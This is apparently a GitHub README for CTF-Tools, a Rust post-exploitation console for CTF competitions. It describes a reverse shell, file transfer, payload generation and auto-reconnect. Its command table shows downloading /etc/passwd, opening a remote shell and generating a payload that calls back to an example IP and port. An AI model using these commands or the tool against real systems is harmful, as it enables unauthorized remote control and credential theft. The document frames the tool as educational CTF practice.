# CTF-Tools

CTF-Tools is a Rust-based console application designed for post-exploitation in CTF competitions, featuring essential
utilities for privilege escalation.

This project was built to learn and explore Rust programming.

## Features

- **Interactive reverse shell** (Based on [rustcat](https://github.com/robiot/rustcat))
- **Upload / Download**
- **Auto-reconnect** (When the client loses connection with the server)
- **Multiple client support**

## Usage

The server and the client are included in the same executable. You can download the executable from
the [releases](https://github.com/dd060606/CTF-Tools/releases)
section.

To start the server, use:

```bash
./ctf-tools
```

To start the client, use:

```bash
./ctf-tools <ip> <port>
```

## Available Commands

Here is a list of commands available:

| Command                                          |                           Description                           |                  Example                   |
|:-------------------------------------------------|:---------------------------------------------------------------:|:------------------------------------------:|
| `help (<command name>)`                          |              Displays a list of available commands              |           `help` or `help list`            |
| `shell`                                          |         Establishes a remote shell on the target client         |                                            |
| `info`                                           | Retrieves detailed information from the client. (OS, User, ...) |                                            |
| `list`                                           |                     Lists connected clients                     |                                            |
| `payloads`                                       |                    Lists available payloads                     |                                            |
| `generate <payload name> <platform> <ip> <port>` |            Generates a payload to execute CTF-Tools             |    `gen default linux 10.10.10.10 8888`    |                                            |
| `select <id>`                                    |                        Selects a client                         |                 `select 2`                 |
| `upload <local path> <remote path>`              |              Uploads a file on the target machine               | `upload /home/kali/test.txt /tmp/test.txt` |
| `download <remote path> (<output path>)`         |            Downloads a file from the target machine             |      `download /etc/passwd ./passwd`       |
| `close`                                          |       Stops the CTF-Tools process on the selected client        |                                            |
| `exit`                                           |            Terminates the CTF-Tools console session.            |                                            |

## Build

Ensure you have Rust installed. If not, download it from [rust-lang.org](https://www.rust-lang.org)

```bash
cargo build --release
```

## Legal Disclaimer

This tool is intended for educational purposes only. Unauthorized use of this tool to exploit systems, networks, or data
without permission is illegal. The authors are not responsible for any misuse or damage caused by this tool. Always
obtain proper authorization before using any security tool.
